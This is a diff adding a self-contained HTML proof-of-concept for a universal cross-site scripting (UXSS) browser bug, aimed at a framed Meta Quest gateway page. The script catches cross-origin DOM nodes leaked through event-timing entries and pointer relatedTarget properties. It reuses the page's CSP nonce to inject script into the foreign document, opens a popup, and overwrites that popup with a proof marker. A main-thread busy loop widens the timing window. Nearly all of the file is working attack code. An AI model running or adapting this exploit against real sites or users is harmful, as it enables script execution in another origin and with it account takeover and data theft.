@@ -1,0 +1,137 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Meta Event Target UXSS PoC</title>
+<style>
+  * { box-sizing: border-box; }
+  body { margin: 0; font: 16px system-ui, sans-serif; background: #101622; color: #eef4ff; }
+  header { padding: 14px 16px; background: #20345d; }
+  header strong { display: block; font-size: 19px; }
+  #instruction { display: block; margin-top: 4px; }
+  iframe { display: block; width: 100%; height: calc(100vh - 78px); border: 4px solid #4e78c7; background: white; }
+</style>
+<header>
+  <strong>Meta Event Target UXSS PoC</strong>
+  <span id="instruction">Tap once inside the framed Meta panel.</span>
+</header>
+<iframe id="victim" name="event_target_meta_victim"></iframe>
+<script>
+(() => {
+  const targetUrl = 'https://gateway.quest.meta.com/';
+  const matchedControl = location.hash === '#control';
+  const seen = new WeakSet();
+  let attacked = false;
+
+  function log() {}
+
+  function nonceFrom(doc) {
+    const element = doc.querySelector('script[nonce],style[nonce]');
+    return element && (element.nonce || element.getAttribute('nonce')) || '';
+  }
+
+  function appendScript(doc, source) {
+    const script = doc.createElement('script');
+    const nonce = nonceFrom(doc);
+    if (nonce) script.nonce = nonce;
+    script.textContent = source;
+    (doc.head || doc.documentElement).appendChild(script);
+  }
+
+  function attackForeignNode(node, entry) {
+    if (attacked || !node || seen.has(node)) return;
+    seen.add(node);
+    let owner;
+    try {
+      owner = node.ownerDocument;
+      log('TARGET_EXPOSED', {
+        entry: entry.name,
+        duration: entry.duration,
+        tag: node.nodeName,
+        sameDocument: owner === document,
+        ownerURL: owner && owner.URL
+      });
+    } catch (error) {
+      log('TARGET_WRAPPER_BLOCKED', {name: error.name, message: error.message});
+      return;
+    }
+    if (!owner || owner === document) return;
+    if (matchedControl) {
+      attacked = true;
+      log('MATCHED_CONTROL_DROPPED_FOREIGN_NODE', {ownerURL: owner.URL});
+      return;
+    }
+    attacked = true;
+
+    const payload = `(() => {
+      const foreignOrigin = location.origin;
+      const foreignUrl = location.href;
+      const popup = window.open(foreignUrl, 'event_target_meta_top_' + Math.random().toString(36).slice(2));
+      if (!popup) return;
+      const proofSource = "document.documentElement.innerHTML='<body style=\\"font:24px system-ui;padding:32px\\"><h1 id=\\"PoC_by_ContractGooner\\">PoC_by_ContractGooner</h1><p id=\\"foreign-origin\\">'+location.origin+'</p></body>';document.title='PoC_by_ContractGooner '+location.origin;alert(location.origin)";
+      let attempts = 0;
+      const timer = setInterval(() => {
+        attempts++;
+        try {
+          if (popup.location.protocol === 'https:' && popup.location.origin === foreignOrigin) {
+            const popupDocument = popup.document;
+            const proofScript = popupDocument.createElement('script');
+            const nonceElement = popupDocument.querySelector('script[nonce],style[nonce]');
+            const nonce = nonceElement && (nonceElement.nonce || nonceElement.getAttribute('nonce'));
+            if (nonce) proofScript.nonce = nonce;
+            proofScript.textContent = proofSource;
+            (popupDocument.head || popupDocument.documentElement).appendChild(proofScript);
+            clearInterval(timer);
+          }
+        } catch (_) {}
+        if (attempts > 100) clearInterval(timer);
+      }, 100);
+    })()`;
+
+    try {
+      appendScript(owner, payload);
+      log('FOREIGN_SCRIPT_APPENDED', {ownerURL: owner.URL, nonce: Boolean(nonceFrom(owner))});
+    } catch (error) {
+      log('FOREIGN_MUTATION_BLOCKED', {name: error.name, message: error.message});
+    }
+  }
+
+  for (const type of [
+    'pointerover', 'pointerout', 'pointerenter', 'pointerleave',
+    'mouseover', 'mouseout', 'mouseenter', 'mouseleave',
+    'focusin', 'focusout'
+  ]) {
+    document.addEventListener(type, event => {
+      let related = null;
+      try { related = event.relatedTarget; } catch (_) {}
+      if (related) attackForeignNode(related, {name: `${type}.relatedTarget`, duration: 0});
+    }, true);
+  }
+
+  if (!('PerformanceObserver' in window)
+      || !PerformanceObserver.supportedEntryTypes.includes('event')) {
+    log('EVENT_TIMING_UNAVAILABLE', PerformanceObserver.supportedEntryTypes);
+  } else {
+    const observer = new PerformanceObserver(list => {
+      for (const entry of list.getEntries()) {
+        let target = null;
+        try { target = entry.target; } catch (error) {
+          log('TARGET_GETTER_THREW', {name: error.name, message: error.message});
+        }
+        log('EVENT', {name: entry.name, duration: entry.duration, target: target && target.nodeName});
+        if (target) attackForeignNode(target, entry);
+      }
+    });
+    observer.observe({type: 'event', buffered: true, durationThreshold: 16});
+    log('OBSERVER_ARMED', {targetUrl, matchedControl});
+  }
+
+  document.querySelector('#victim').src = targetUrl;
+  const stressDeadline = performance.now() + 20000;
+  const stressFrame = () => {
+    const sliceEnd = performance.now() + 24;
+    while (performance.now() < sliceEnd) {}
+    if (performance.now() < stressDeadline) requestAnimationFrame(stressFrame);
+  };
+  requestAnimationFrame(stressFrame);
+})();
+</script>
